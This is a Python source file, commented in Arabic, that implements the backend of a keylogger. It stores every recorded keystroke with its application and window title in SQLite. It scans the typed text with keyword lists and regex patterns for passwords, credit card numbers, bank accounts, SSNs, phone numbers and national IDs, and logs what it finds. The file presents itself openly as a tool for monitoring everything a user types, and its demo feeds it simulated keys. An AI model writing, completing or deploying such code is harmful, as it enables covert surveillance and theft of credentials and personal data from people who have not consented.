#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
نظام Keylogger متكامل - مراقبة كل ما يُكتب
Advanced Keylogger System for Comprehensive Keystroke Monitoring
"""

import os
import json
import time
import sqlite3
import threading
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
import hashlib
import re
from dataclasses import dataclass, asdict
import logging

# إعداد نظام السجلات
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class KeystrokeEvent:
    """فئة لتمثيل حدث ضغطة مفتاح"""
    timestamp: str
    key: str
    application: str
    window_title: str
    key_type: str  # 'normal', 'special', 'combination'
    context: str  # السياق المحيط بالضغطة
    session_id: str
    device_id: str
    
class KeyloggerDatabase:
    """مدير قاعدة بيانات Keylogger"""
    
    def __init__(self, db_path: str = "keylogger.db"):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """إنشاء جداول قاعدة البيانات"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # جدول الضغطات الأساسي
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keystrokes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                key_value TEXT NOT NULL,
                application TEXT,
                window_title TEXT,
                key_type TEXT DEFAULT 'normal',
                context TEXT,
                session_id TEXT,
                device_id TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # جدول الجلسات
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                device_id TEXT NOT NULL,
                start_time DATETIME,
                end_time DATETIME,
                total_keystrokes INTEGER DEFAULT 0,
                applications_used TEXT,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        # جدول التحليلات النصية
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS text_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                application TEXT,
                extracted_text TEXT,
                keywords TEXT,
                sensitive_data TEXT,
                analysis_type TEXT,
                confidence_score REAL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # جدول الكلمات المفتاحية الحساسة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sensitive_keywords (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                keyword TEXT UNIQUE NOT NULL,
                category TEXT,
                severity_level INTEGER DEFAULT 1,
                description TEXT,
                is_active BOOLEAN DEFAULT 1
            )
        ''')
        
        conn.commit()
        conn.close()
        
        # إدراج كلمات مفتاحية افتراضية
        self._insert_default_keywords()
    
    def _insert_default_keywords(self):
        """إدراج كلمات مفتاحية حساسة افتراضية"""
        default_keywords = [
            ("password", "authentication", 3, "كلمة مرور"),
            ("credit card", "financial", 3, "بطاقة ائتمان"),
            ("social security", "personal", 3, "رقم هوية"),
            ("bank account", "financial", 3, "حساب بنكي"),
            ("login", "authentication", 2, "تسجيل دخول"),
            ("email", "communication", 1, "بريد إلكتروني"),
            ("phone", "personal", 2, "رقم هاتف"),
            ("address", "personal", 2, "عنوان"),
            ("secret", "confidential", 3, "سري"),
            ("confidential", "confidential", 3, "سري"),
            ("private", "confidential", 2, "خاص"),
            ("كلمة المرور", "authentication", 3, "كلمة مرور عربية"),
            ("رقم سري", "authentication", 3, "رقم سري"),
            ("حساب بنكي", "financial", 3, "حساب بنكي عربي"),
            ("بطاقة", "financial", 2, "بطاقة"),
            ("سري", "confidential", 3, "سري عربي"),
            ("خاص", "confidential", 2, "خاص عربي")
        ]
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        for keyword, category, severity, description in default_keywords:
            cursor.execute('''
                INSERT OR IGNORE INTO sensitive_keywords 
                (keyword, category, severity_level, description)
                VALUES (?, ?, ?, ?)
            ''', (keyword, category, severity, description))
        
        conn.commit()
        conn.close()
    
    def insert_keystroke(self, event: KeystrokeEvent):
        """إدراج ضغطة مفتاح في قاعدة البيانات"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO keystrokes 
            (timestamp, key_value, application, window_title, key_type, context, session_id, device_id)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            event.timestamp, event.key, event.application, event.window_title,
            event.key_type, event.context, event.session_id, event.device_id
        ))
        
        conn.commit()
        conn.close()
    
    def get_keystrokes(self, device_id: str = None, limit: int = 1000) -> List[Dict]:
        """استرجاع ضغطات المفاتيح"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        if device_id:
            cursor.execute('''
                SELECT * FROM keystrokes 
                WHERE device_id = ? 
                ORDER BY created_at DESC 
                LIMIT ?
            ''', (device_id, limit))
        else:
            cursor.execute('''
                SELECT * FROM keystrokes 
                ORDER BY created_at DESC 
                LIMIT ?
            ''', (limit,))
        
        columns = [description[0] for description in cursor.description]
        results = [dict(zip(columns, row)) for row in cursor.fetchall()]
        
        conn.close()
        return results

class TextAnalyzer:
    """محلل النصوص المتقدم"""
    
    def __init__(self, db: KeyloggerDatabase):
        self.db = db
        self.sensitive_patterns = self._load_sensitive_patterns()
    
    def _load_sensitive_patterns(self) -> Dict[str, re.Pattern]:
        """تحميل أنماط البيانات الحساسة"""
        patterns = {
            'email': re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'),
            'phone': re.compile(r'\b(?:\+?1[-.\s]?)?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}\b'),
            'credit_card': re.compile(r'\b(?:\d{4}[-\s]?){3}\d{4}\b'),
            'ssn': re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
            'ip_address': re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'),
            'url': re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'),
            'arabic_phone': re.compile(r'\b(?:\+?966|0)?[5-9][0-9]{8}\b'),
            'arabic_id': re.compile(r'\b[1-2][0-9]{9}\b')
        }
        return patterns
    
    def analyze_text(self, text: str, application: str, session_id: str) -> Dict:
        """تحليل النص واستخراج البيانات الحساسة"""
        analysis_result = {
            'extracted_data': {},
            'keywords_found': [],
            'sensitivity_score': 0,
            'data_types': []
        }
        
        # البحث عن الأنماط الحساسة
        for pattern_name, pattern in self.sensitive_patterns.items():
            matches = pattern.findall(text)
            if matches:
                analysis_result['extracted_data'][pattern_name] = matches
                analysis_result['data_types'].append(pattern_name)
                analysis_result['sensitivity_score'] += len(matches) * 2
        
        # البحث عن الكلمات المفتاحية
        keywords = self._find_sensitive_keywords(text)
        analysis_result['keywords_found'] = keywords
        analysis_result['sensitivity_score'] += len(keywords)
        
        # حفظ التحليل في قاعدة البيانات
        self._save_analysis(session_id, application, text, analysis_result)
        
        return analysis_result
    
    def _find_sensitive_keywords(self, text: str) -> List[Dict]:
        """البحث عن الكلمات المفتاحية الحساسة"""
        conn = sqlite3.connect(self.db.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT keyword, category, severity_level FROM sensitive_keywords WHERE is_active = 1')
        keywords = cursor.fetchall()
        conn.close()
        
        found_keywords = []
        text_lower = text.lower()
        
        for keyword, category, severity in keywords:
            if keyword.lower() in text_lower:
                found_keywords.append({
                    'keyword': keyword,
                    'category': category,
                    'severity': severity,
                    'positions': [i for i in range(len(text_lower)) if text_lower.startswith(keyword.lower(), i)]
                })
        
        return found_keywords
    
    def _save_analysis(self, session_id: str, application: str, text: str, analysis: Dict):
        """حفظ نتائج التحليل"""
        conn = sqlite3.connect(self.db.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO text_analysis 
            (session_id, application, extracted_text, keywords, sensitive_data, analysis_type, confidence_score)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            session_id, application, text[:1000],  # حد أقصى 1000 حرف
            json.dumps(analysis['keywords_found'], ensure_ascii=False),
            json.dumps(analysis['extracted_data'], ensure_ascii=False),
            'automatic',
            analysis['sensitivity_score']
        ))
        
        conn.commit()
        conn.close()

class KeyloggerCore:
    """النواة الأساسية لنظام Keylogger"""
    
    def __init__(self, device_id: str):
        self.device_id = device_id
        self.db = KeyloggerDatabase()
        self.analyzer = TextAnalyzer(self.db)
        self.session_id = self._generate_session_id()
        self.is_running = False
        self.current_text_buffer = ""
        self.last_application = ""
        self.keystroke_count = 0
        
        # إعدادات التحليل
        self.buffer_size = 100  # حجم المخزن المؤقت للنص
        self.analysis_interval = 30  # فترة التحليل بالثواني
        
        # بدء جلسة جديدة
        self._start_session()
    
    def _generate_session_id(self) -> str:
        """توليد معرف جلسة فريد"""
        timestamp = str(int(time.time()))
        device_hash = hashlib.md5(self.device_id.encode()).hexdigest()[:8]
        return f"session_{device_hash}_{timestamp}"
    
    def _start_session(self):
        """بدء جلسة مراقبة جديدة"""
        conn = sqlite3.connect(self.db.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO sessions (session_id, device_id, start_time, status)
            VALUES (?, ?, ?, ?)
        ''', (self.session_id, self.device_id, datetime.now().isoformat(), 'active'))
        
        conn.commit()
        conn.close()
        
        logger.info(f"بدء جلسة مراقبة جديدة: {self.session_id}")
    
    def process_keystroke(self, key: str, application: str, window_title: str):
        """معالجة ضغطة مفتاح واحدة"""
        if not self.is_running:
            return
        
        # تحديد نوع المفتاح
        key_type = self._determine_key_type(key)
        
        # إنشاء حدث ضغطة المفتاح
        event = KeystrokeEvent(
            timestamp=datetime.now().isoformat(),
            key=key,
            application=application,
            window_title=window_title,
            key_type=key_type,
            context=self.current_text_buffer[-50:],  # آخر 50 حرف كسياق
            session_id=self.session_id,
            device_id=self.device_id
        )
        
        # حفظ في قاعدة البيانات
        self.db.insert_keystroke(event)
        
        # تحديث المخزن المؤقت للنص
        self._update_text_buffer(key, application)
        
        # زيادة عداد الضغطات
        self.keystroke_count += 1
        
        # تحليل النص عند الحاجة
        if len(self.current_text_buffer) >= self.buffer_size:
            self._analyze_current_buffer(application)
    
    def _determine_key_type(self, key: str) -> str:
        """تحديد نوع المفتاح"""
        special_keys = ['Enter', 'Tab', 'Space', 'Backspace', 'Delete', 'Escape', 'Shift', 'Ctrl', 'Alt']
        
        if key in special_keys:
            return 'special'
        elif '+' in key:  # مفاتيح مركبة مثل Ctrl+C
            return 'combination'
        else:
            return 'normal'
    
    def _update_text_buffer(self, key: str, application: str):
        """تحديث المخزن المؤقت للنص"""
        if key == 'Backspace':
            if self.current_text_buffer:
                self.current_text_buffer = self.current_text_buffer[:-1]
        elif key == 'Enter':
            self.current_text_buffer += '\n'
        elif key == 'Tab':
            self.current_text_buffer += '\t'
        elif key == 'Space':
            self.current_text_buffer += ' '
        elif len(key) == 1:  # حرف عادي
            self.current_text_buffer += key
        
        # تنظيف المخزن المؤقت إذا تجاوز الحد الأقصى
        if len(self.current_text_buffer) > self.buffer_size * 2:
            self.current_text_buffer = self.current_text_buffer[-self.buffer_size:]
        
        # تحديث التطبيق الحالي
        self.last_application = application
    
    def _analyze_current_buffer(self, application: str):
        """تحليل المحتوى الحالي للمخزن المؤقت"""
        if len(self.current_text_buffer.strip()) > 10:  # تحليل فقط إذا كان هناك محتوى كافي
            analysis = self.analyzer.analyze_text(
                self.current_text_buffer, 
                application, 
                self.session_id
            )
            
            # إشعار في حالة وجود بيانات حساسة
            if analysis['sensitivity_score'] > 5:
                logger.warning(f"تم اكتشاف بيانات حساسة في {application}: نقاط الحساسية {analysis['sensitivity_score']}")
            
            # مسح المخزن المؤقت بعد التحليل
            self.current_text_buffer = ""
    
    def start_monitoring(self):
        """بدء المراقبة"""
        self.is_running = True
        logger.info("تم بدء مراقبة ضغطات المفاتيح")
        
        # بدء خيط التحليل الدوري
        analysis_thread = threading.Thread(target=self._periodic_analysis)
        analysis_thread.daemon = True
        analysis_thread.start()
    
    def stop_monitoring(self):
        """إيقاف المراقبة"""
        self.is_running = False
        self._end_session()
        logger.info("تم إيقاف مراقبة ضغطات المفاتيح")
    
    def _periodic_analysis(self):
        """تحليل دوري للمحتوى"""
        while self.is_running:
            time.sleep(self.analysis_interval)
            if self.current_text_buffer.strip():
                self._analyze_current_buffer(self.last_application)
    
    def _end_session(self):
        """إنهاء الجلسة الحالية"""
        conn = sqlite3.connect(self.db.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE sessions 
            SET end_time = ?, total_keystrokes = ?, status = ?
            WHERE session_id = ?
        ''', (datetime.now().isoformat(), self.keystroke_count, 'completed', self.session_id))
        
        conn.commit()
        conn.close()
    
    def get_session_stats(self) -> Dict:
        """إحصائيات الجلسة الحالية"""
        return {
            'session_id': self.session_id,
            'device_id': self.device_id,
            'keystroke_count': self.keystroke_count,
            'current_application': self.last_application,
            'buffer_size': len(self.current_text_buffer),
            'is_running': self.is_running
        }

class KeyloggerAPI:
    """واجهة برمجة التطبيقات لنظام Keylogger"""
    
    def __init__(self, device_id: str):
        self.keylogger = KeyloggerCore(device_id)
    
    def start(self):
        """بدء المراقبة"""
        self.keylogger.start_monitoring()
        return {"status": "started", "session_id": self.keylogger.session_id}
    
    def stop(self):
        """إيقاف المراقبة"""
        self.keylogger.stop_monitoring()
        return {"status": "stopped"}
    
    def get_keystrokes(self, limit: int = 100) -> List[Dict]:
        """الحصول على ضغطات المفاتيح"""
        return self.keylogger.db.get_keystrokes(self.keylogger.device_id, limit)
    
    def get_analysis(self, session_id: str = None) -> List[Dict]:
        """الحصول على نتائج التحليل"""
        conn = sqlite3.connect(self.keylogger.db.db_path)
        cursor = conn.cursor()
        
        if session_id:
            cursor.execute('''
                SELECT * FROM text_analysis 
                WHERE session_id = ? 
                ORDER BY created_at DESC
            ''', (session_id,))
        else:
            cursor.execute('''
                SELECT * FROM text_analysis 
                ORDER BY created_at DESC 
                LIMIT 50
            ''')
        
        columns = [description[0] for description in cursor.description]
        results = [dict(zip(columns, row)) for row in cursor.fetchall()]
        
        conn.close()
        return results
    
    def get_stats(self) -> Dict:
        """إحصائيات عامة"""
        conn = sqlite3.connect(self.keylogger.db.db_path)
        cursor = conn.cursor()
        
        # إحصائيات عامة
        cursor.execute('SELECT COUNT(*) FROM keystrokes')
        total_keystrokes = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM sessions')
        total_sessions = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM text_analysis WHERE confidence_score > 5')
        sensitive_detections = cursor.fetchone()[0]
        
        # إحصائيات اليوم
        today = datetime.now().date().isoformat()
        cursor.execute('SELECT COUNT(*) FROM keystrokes WHERE DATE(created_at) = ?', (today,))
        today_keystrokes = cursor.fetchone()[0]
        
        conn.close()
        
        return {
            'total_keystrokes': total_keystrokes,
            'total_sessions': total_sessions,
            'sensitive_detections': sensitive_detections,
            'today_keystrokes': today_keystrokes,
            'current_session': self.keylogger.get_session_stats()
        }

# مثال على الاستخدام
if __name__ == "__main__":
    # إنشاء مثيل من نظام Keylogger
    device_id = "test_device_001"
    keylogger_api = KeyloggerAPI(device_id)
    
    # بدء المراقبة
    print("بدء مراقبة ضغطات المفاتيح...")
    result = keylogger_api.start()
    print(f"النتيجة: {result}")
    
    # محاكاة بعض ضغطات المفاتيح
    test_keystrokes = [
        ("h", "Chrome", "Google Search"),
        ("e", "Chrome", "Google Search"),
        ("l", "Chrome", "Google Search"),
        ("l", "Chrome", "Google Search"),
        ("o", "Chrome", "Google Search"),
        ("Space", "Chrome", "Google Search"),
        ("w", "Chrome", "Google Search"),
        ("o", "Chrome", "Google Search"),
        ("r", "Chrome", "Google Search"),
        ("l", "Chrome", "Google Search"),
        ("d", "Chrome", "Google Search"),
        ("Enter", "Chrome", "Google Search")
    ]
    
    for key, app, window in test_keystrokes:
        keylogger_api.keylogger.process_keystroke(key, app, window)
        time.sleep(0.1)
    
    # الحصول على الإحصائيات
    stats = keylogger_api.get_stats()
    print(f"الإحصائيات: {json.dumps(stats, ensure_ascii=False, indent=2)}")
    
    # إيقاف المراقبة
    time.sleep(2)
    keylogger_api.stop()
    print("تم إيقاف المراقبة")

